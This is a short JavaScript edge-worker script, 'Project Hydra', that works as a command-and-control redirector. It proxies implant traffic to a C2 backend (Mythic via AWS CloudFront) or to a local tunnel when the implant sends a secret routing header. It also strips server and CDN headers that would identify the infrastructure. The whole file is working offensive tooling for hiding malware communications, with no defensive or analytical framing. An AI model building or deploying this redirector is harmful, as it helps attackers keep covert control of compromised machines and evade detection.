/**
 * Project Hydra: Hybrid Edge Redirector (AWS + Local Tunnel)
 */
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    // DEFAULT ROUTE: Traffic goes to AWS CloudFront (Mythic)
    let backend = env.C2_BACKEND; 
    
    // HYBRID ROUTE: If the implant sends this secret header, route to Local PC
    if (request.headers.get("X-Hydra-Route") === "local-lifter") {
        backend = env.LOCAL_TUNNEL;
    }

    const targetUrl = backend + url.pathname + url.search;
    const proxyRequest = new Request(targetUrl, request);

    try {
        const response = await fetch(proxyRequest);
        const newResponse = new Response(response.body, response);
        
        // Strip identifying headers
        newResponse.headers.delete("Server");
        newResponse.headers.delete("X-Cache");
        newResponse.headers.delete("Via");
        newResponse.headers.delete("X-Amz-Cf-Pop");
        newResponse.headers.delete("X-Amz-Cf-Id");
        
        return newResponse;
    } catch (e) {
        return new Response("Service Unavailable", { status: 503 });
    }
  }
};